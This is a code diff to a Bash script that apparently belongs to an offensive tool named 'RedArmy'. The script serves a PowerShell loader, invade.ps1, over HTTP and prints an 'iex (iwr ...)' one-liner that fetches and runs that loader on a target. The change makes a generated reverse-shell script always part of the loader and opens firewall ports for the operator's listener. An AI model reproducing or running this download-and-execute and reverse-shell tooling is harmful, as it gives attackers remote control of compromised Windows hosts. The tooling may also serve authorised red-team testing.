@@ -138,7 +138,6 @@ Options:
     -h, --help        Display this help message
     --no-color        Disable colorized output
     -p, --port=NUM    Use the specified port (default: 8080)
-    --rip=IPADDR      Create rshell.ps1 using specified IP address
     --rport=NUM       Use the specified port for reverse shell
                       (default: 4444)
     -u, --update      Update git submodules (if git is installed)
@@ -148,11 +147,11 @@ EOF
 }
 
 declare -a args deps
-unset help rshell_ip update
+unset help update
 color="true"
 deps+=("iptables")
 port="8080"
-rshell_ip="4444"
+rshell="4444"
 
 # Check for missing dependencies
 check_deps
@@ -164,8 +163,7 @@ while [[ $# -gt 0 ]]; do
         "-h"|"--help") help="true" ;;
         "--no-color") unset color ;;
         "-p"|"--port"*) port="$(long_opt "$@")" || shift ;;
-        "--rip"*) rshell_ip="$(long_opt "$@")" || shift ;;
-        "--rport"*) rshell_port="$(long_opt "$@")" || shift ;;
+        "-r"|"--rport"*) rshell="$(long_opt "$@")" || shift ;;
         "-u"|"--update"*) update="true" ;;
         *) args+=("$1") ;;
     esac
@@ -194,6 +192,10 @@ cwd="\$ExecutionContext.SessionState.Path.CurrentLocation"
 languagemode="\$ExecutionContext.SessionState.LanguageMode"
 red="\$([char]27)[41m"
 reset="\$([char]27)[0m"
+
+# Create reverse shell powershell script
+./reverse_powershell -p "$rshell" "$ip" >rshell.ps1
+
 # Setup invade.ps1
 cat >invade.ps1 <<EOF
 if (($languagemode -match "constrained")) {
@@ -205,6 +207,9 @@ $(
     while read -r name path; do
         deploy "$name" "$path"
     done < <(grep -Psv "^\s*(#.*)?$" "$config"); unset name path
+
+    # Add reverse shell function
+    deploy ReverseShell ./rshell.ps1
 )
 
 # Change prompt colors so user knows RedArmy is loaded in current
@@ -214,29 +219,20 @@ function prompt {
 }
 EOF
 
-if [[ -n $rshell_ip ]]; then
-    # Create reverse shell powershell script
-    ./reverse_powershell -p "$rshell_port" "$rshell_ip" >rshell.ps1
-
-    # Add reverse shell function
-    deploy ReverseShell ./rshell.ps1 >>invade.ps1
-
-    warn "Don't forget to setup your reverse shell listener"
-fi
-
 # Let user know what to type
 info "iex (iwr -DisableKeepAlive -UseBasicParsing $url/invade.ps1)"
+warn "Don't forget your reverse shell listener on port $rshell"
 
 # Open firewall
 sudo iptables -I INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
-sudo iptables -I INPUT -p udp -d "$ip" --dport "$port" -j ACCEPT
+sudo iptables -I INPUT -p tcp -d "$ip" --dport "$rshell" -j ACCEPT
 
 # Serve via HTTP
 simplehttp "$port"
 
 # Close firewall
 sudo iptables -D INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
-sudo iptables -D INPUT -p udp -d "$ip" --dport "$port" -j ACCEPT
+sudo iptables -D INPUT -p tcp -d "$ip" --dport "$rshell" -j ACCEPT
 
 # Cleanup
 rm -rf invade.ps1
